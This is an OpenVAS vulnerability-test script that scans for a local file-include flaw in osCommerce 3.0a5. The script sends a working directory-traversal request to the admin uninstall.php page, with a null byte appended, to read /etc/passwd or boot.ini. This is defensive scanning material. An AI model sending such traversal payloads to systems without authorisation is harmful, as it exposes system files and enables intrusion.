###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_oscommerce_39820.nasl 14 2013-10-27 12:33:37Z jan $
#
# osCommerce Local File Include and HTML Injection Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "osCommerce is prone to a local file-include vulnerability and an HTML-
injection vulnerability because it fails to properly sanitize user-
supplied input.

An attacker can exploit the local file-include vulnerability using directory-
traversal strings to execute local files within the context of the
webserver process.

The attacker may leverage the HTML-injection issue to execute
arbitrary HTML and script code in the context of the affected browser.
This may let the attacker steal cookie-based authentication
credentials or control how the site is rendered to the user.

osCommerce 3.0a5 is affected; other versions may also be vulnerable.";


if (description)
{
 script_id(100616);
 script_version("$Revision: 14 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2010-05-04 12:32:13 +0200 (Tue, 04 May 2010)");
 script_bugtraq_id(39820);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

 script_name("osCommerce Local File Include and HTML Injection Vulnerabilities");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/39820");
 script_xref(name : "URL" , value : "http://www.oscommerce.com");
 script_xref(name : "URL" , value : "http://ictsec.wordpress.com/exploits/oscommerce-v3-0a5-multiple-vulnerabilities/");

 script_tag(name:"risk_factor", value:"Medium");
 script_description(desc);
 script_summary("Determine if osCommerce is prone to a local file-include vulnerability");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("oscommerce_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

if(!dir = get_dir_from_kb(port:port,app:"oscommerce"))exit(0);
files = make_array("root:.*:0:[01]:","etc/passwd","\[boot loader\]","boot.ini");

foreach file (keys(files)) {

  url =  string(dir,"/admin/includes/applications/services/pages/uninstall.php?module=../../../../../../../../",files[file],"%00"); 

  if(http_vuln_check(port:port, url:url,pattern:file)) {
     
    security_warning(port:port);
    exit(0);

  }
}

exit(0);
